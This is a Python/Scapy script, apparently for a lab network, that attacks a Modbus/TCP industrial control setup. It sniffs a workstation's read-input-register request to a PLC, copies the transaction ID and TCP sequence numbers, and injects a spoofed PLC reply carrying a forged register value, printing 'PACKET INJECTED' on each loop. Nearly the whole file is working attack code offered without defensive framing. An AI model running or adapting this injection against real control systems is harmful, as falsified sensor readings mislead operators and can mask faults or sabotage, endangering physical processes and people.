import sys
from scapy.all import *
Transaction_ID = 0
attacker = "192.168.88.201"
workstation = "192.168.88.202"
plc = "192.168.88.10"
interface = "eth0"
MAC_PLC = "a6:83:e7:d3:3f:64"
MAC_WORKSTATION = "08:00:27:1d:d0:b5"
MAC_ATTACKER = "08:00:27:88:85:88"
input_read_hex = "\\x00\\x00\\x00\\x06\\x01\\x04\\x00\\x00\\x00\\x01"
coil_read_hex = "\\x00\\x00\\x00\\x04\\x01\\x01\\x01"
loop = 0
try:
    while True:
        # flag = 1
        # while flag:
        #     READ_COIL = sniff(iface=interface, count=1,lfilter=lambda x: x.haslayer(TCP) and x[IP].dst == workstation and x[TCP].flags == "PA")[0]
        #     try:
        #         if coil_read_hex in str(READ_COIL[Raw].load):
        #             flag=0	
        #     except:
        #         flag=1
        flag = 1
        while flag:
            READ_INPUT = sniff(iface=interface, count=1,lfilter=lambda x: x.haslayer(TCP) and x[IP].dst == plc and x[TCP].flags == "PA")[0]
            try:
                if input_read_hex in str(READ_INPUT[Raw].load):
                    flag=0	
            except:
                flag=1
        ACK = sniff(iface=interface, count=1,lfilter=lambda x: x.haslayer(TCP) and x[IP].dst == workstation and x[TCP].flags == "A")[0]
        Transaction_str = str(READ_INPUT[Raw].load.hex())[0:-20]
        Transaction_ID = int(Transaction_str,16)
        print(Transaction_ID)
        # Modbus Layer Definition
        class ModbusTCP(Packet):
            name = "modbustcp"
            fields_desc = [ ShortField("Transaction Identifier", Transaction_ID), 
                            ShortField("Protocol Identifier", 0),
                            ShortField("Length", 5),
                            ByteField("Unit Identifier",1)
                            ]
                                
            #Modbus Write Multiple Coils                    
        class Modbus(Packet):
            name = "modbus"
            fields_desc = [ XByteField("Function Code", 4),   
                            XByteField("Byte Count", 2),
                            ShortField("Register Value (UINT16)", 100)
                            ]

        data = {
            'sport': ACK[TCP].dport,
            'dport': ACK[TCP].sport,
            'window' : READ_INPUT[TCP].window,
            'id' : ACK[IP].id,
            'flags' : ACK[IP].flags
            }

        seq = ACK[TCP].seq
        ack = ACK[TCP].ack
        # PAYLOAD_ACK = Ether(src=MAC_ATTACKER, dst=MAC_WORKSTATION)/ \
        #     IP(src=plc, dst=workstation,ttl=128,id = data['id'],flags=data['flags']) / \
        #     TCP(sport=data['sport'], dport=data['dport'],
        #     flags="A", window=4096, seq= seq, ack=ack)        
        # PAYLOAD_MODBUS = Ether(src=MAC_ATTACKER, dst=MAC_WORKSTATION)/ \
        #             IP(src=plc, dst=workstation,ttl=128,id = data['id'],flags=data['flags']) / \
        #             TCP(sport=data['sport'], dport=data['dport'],
        #             flags="PA", window=data['window'], seq= seq, ack=ack)/ \
        #             ModbusTCP()/Modbus()

        # PAYLOAD_ACK = IP(src=plc, dst=workstation,ttl=128,id = data['id'],flags=data['flags']) / \
        #     TCP(sport=data['sport'], dport=data['dport'],
        #     flags="A", window=4096, seq= seq, ack=ack)        
        PAYLOAD_MODBUS = IP(src=plc, dst=workstation,ttl=128,id = data['id'],flags=data['flags']) / \
                    TCP(sport=data['sport'], dport=data['dport'],
                    flags="PA", window=data['window'], seq=seq, ack=ack)/ \
                    ModbusTCP()/Modbus()


        # sendp(PAYLOAD_ACK, verbose=0, iface=interface)
        # sendp(PAYLOAD_MODBUS, verbose=0, iface=interface)

        # send(PAYLOAD_ACK, verbose=0, iface=interface)
        send(PAYLOAD_MODBUS, verbose=0, iface=interface) 
        print("---------------------------- PACKET INJECTED")
        loop = 1

except KeyboardInterrupt:
    print('Exited!')